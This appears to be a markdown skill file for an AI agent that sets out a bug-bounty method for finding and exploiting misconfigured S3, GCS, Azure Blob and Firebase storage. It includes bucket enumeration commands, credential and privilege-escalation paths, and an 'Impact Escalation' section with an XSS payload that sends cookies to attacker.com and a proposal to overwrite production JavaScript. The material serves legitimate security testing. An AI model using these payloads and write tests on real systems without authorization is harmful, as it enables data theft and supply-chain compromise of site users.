---
name: s3-bucket-misconfig
description: Cloud storage misconfiguration testing — S3, GCS, Azure Blob public access, and privilege escalation
---

# Cloud Storage Misconfiguration

Publicly exposed cloud storage buckets and containers are among the most commonly reported (and rewardable) findings in bug bounty. S3, GCS, and Azure Blob misconfigurations can expose sensitive files, enable data writes that lead to stored XSS or supply chain attacks, and provide a pivot to further cloud compromise.

## AWS S3

### Discovery

```bash
# Direct access
aws s3 ls s3://target-bucket --no-sign-request

# Name guessing patterns
target, target-backup, target-dev, target-prod, target-assets, target-static
target-logs, target-data, target-uploads, target-files, target-www
target-YYYY, target-internal, target-cdn, target-images

# Tools
S3Scanner -bucket target-backup --no-sign-request
awscli: aws s3 ls s3://BUCKET --no-sign-request

# From web app
# Check JS files for bucket URLs: s3.amazonaws.com/bucket or bucket.s3.amazonaws.com
# Network tab: look for requests to amazonaws.com
# Source maps, error messages, HTML comments

# Google dork
site:s3.amazonaws.com "target.com" OR "target-backup" OR "targetcorp"
```

### Misconfiguration Testing

```bash
# List bucket (public read)
aws s3 ls s3://target-bucket --no-sign-request

# Download file
aws s3 cp s3://target-bucket/sensitive.txt /tmp/ --no-sign-request

# Upload file (public write — critical!)
aws s3 cp /tmp/test.txt s3://target-bucket/test.txt --no-sign-request
# If successful → stored XSS possible, supply chain attack if serving JS files

# ACL check
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Policy check
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# Public access block settings
aws s3api get-public-access-block --bucket target-bucket

# CORS configuration
aws s3api get-bucket-cors --bucket target-bucket --no-sign-request

# Versioning (old versions of "deleted" files)
aws s3api list-object-versions --bucket target-bucket --no-sign-request
```

### Sensitive Files to Look For

```
# Credentials
.env, .env.*, config.yml, database.yml, credentials.json, .aws/credentials
# Backups
*.sql, *.dump, *.bak, *.tar.gz, backup.zip
# Source code
*.py, *.js, *.php (not expected in public bucket)
# Private data
*.csv (user exports), *.xls (internal reports)
# Keys
*.pem, *.key, id_rsa, *.p12, *.pfx
# Logs
access.log, error.log, debug.log (may contain tokens/sessions)
```

### Impact Escalation

```bash
# If write access: stored XSS via uploaded HTML/JS
echo '<script>document.location="http://attacker.com/?c="+document.cookie</script>' > xss.html
aws s3 cp xss.html s3://target-assets/xss.html --no-sign-request --content-type text/html
# Serve: https://target-assets.s3.amazonaws.com/xss.html
# If target site loads scripts from this bucket → supply chain attack

# Check if bucket serves CDN/static assets
# Find: <script src="https://s3.amazonaws.com/target-assets/app.js">
# If writable: overwrite app.js → XSS for all users

# Check for pre-signed URL pattern
# If bucket serves time-limited signed URLs, listing may still be possible
```

### AWS Privilege Escalation from Leaked Keys

```bash
# After finding AWS credentials:
aws sts get-caller-identity  # Identify role/user
aws iam get-user
aws iam list-attached-user-policies
aws iam list-user-policies --user-name USERNAME
aws s3 ls  # List all accessible buckets

# Common escalation paths:
# s3:GetObject on secrets bucket → credentials
# iam:PassRole + ec2:RunInstances → EC2 with privileged role
# lambda:UpdateFunctionCode → modify existing Lambda for code execution
# ssm:GetParameter → fetch secrets from Parameter Store
```

## Google Cloud Storage (GCS)

```bash
# Public bucket test
gsutil ls gs://target-backup
gsutil ls -la gs://target-backup  # With sizes

# Download
gsutil cp gs://target-bucket/file.txt /tmp/

# Upload test
gsutil cp /tmp/test.txt gs://target-bucket/test.txt

# Check IAM (allUsers read = public)
gsutil iam get gs://target-bucket

# CORS config
gsutil cors get gs://target-bucket

# Discovery via web
# https://storage.googleapis.com/target-bucket/
# Network requests to storage.googleapis.com
```

## Azure Blob Storage

```bash
# Check anonymous access
curl https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list

# List blobs
az storage blob list --container-name CONTAINER --account-name ACCOUNT --output table

# Download
curl https://ACCOUNT.blob.core.windows.net/CONTAINER/file.txt

# Pattern for account name discovery
COMPANY, COMPANYdev, COMPANYprod, COMPANYstg, COMPANYbackup

# Google dork
site:blob.core.windows.net "targetcompany"
```

## Firebase / Firestore

```bash
# Test public read
curl "https://TARGET.firebaseio.com/.json"
curl "https://TARGET.firebaseio.com/users.json"

# Public write
curl -X PUT -d '{"test":"value"}' "https://TARGET.firebaseio.com/pwned.json"

# Firebase Storage
curl "https://firebasestorage.googleapis.com/v0/b/TARGET.appspot.com/o"
```

## CORS Misconfiguration on Storage

```bash
# CORS allowing any origin on S3 static assets with credentials:
# Attacker can read signed resources cross-origin

# Check CORS policy
aws s3api get-bucket-cors --bucket target --no-sign-request
# Dangerous: AllowedOrigin: *, AllowedMethod: GET+POST+DELETE
```

## Testing Methodology

1. **Discover bucket names** — JS analysis, network tab, error messages, dork patterns
2. **Test list access** — `aws s3 ls --no-sign-request`
3. **Test download** — Attempt to download sensitive files
4. **Test upload** — Attempt write access (determine if XSS/supply chain possible)
5. **Check CDN integration** — Is this bucket serving CSS/JS for production?
6. **Enumerate old versions** — Check versioning for "deleted" sensitive files
7. **Check signed URLs** — Are signed URLs time-limited? Can listing be performed?
8. **Check CORS** — AllowedOrigins and methods

## Validation

1. List the bucket contents and show sensitive file names
2. Download a non-sensitive file to prove read access
3. For write: upload a benign test file (`test-bbounty-TIMESTAMP.txt`)
4. For XSS potential: show the bucket serves JS/HTML to production and write access exists
5. Document AWS account ID / resource ARN for scope confirmation

## False Positives

- Bucket is intentionally public (static website, public media CDN)
- Files are non-sensitive (public marketing images, documentation)
- Listing returns 403 but individual files may still be accessible (check specific paths)

## Impact

- Data exposure: PII, credentials, backups, source code
- Supply chain attack: modifying shared JS/CSS assets → XSS for all users
- Cloud credential theft: AWS/GCP keys in exposed configs
- Compliance violations: GDPR, HIPAA, PCI-DSS for exposed customer data

## Pro Tips

1. Even "private" buckets may be publicly listable — always test without auth first
2. If bucket serves production JS, write access = P1 critical (supply chain XSS)
3. Object versioning keeps "deleted" files — always check with `list-object-versions`
4. Bucket name + region = fixed — guess names from company patterns and common suffixes
5. CloudFront CDN often fronts S3 — bucket may be public even if CDN appears private
6. `AllUsers:READ` ACL on individual objects can expose files even in "private" buckets
7. Check `robots.txt` and `sitemap.xml` for bucket URLs developers added by mistake
8. GCS `allUsers` IAM binding = fully public — check `iam get` before manual testing

## Summary

Cloud storage misconfigurations expose data through public listing, direct file access, and write access enabling supply chain attacks. Discover buckets through JS analysis and dorks, test with no credentials first, and escalate to write access for maximum impact demonstration.
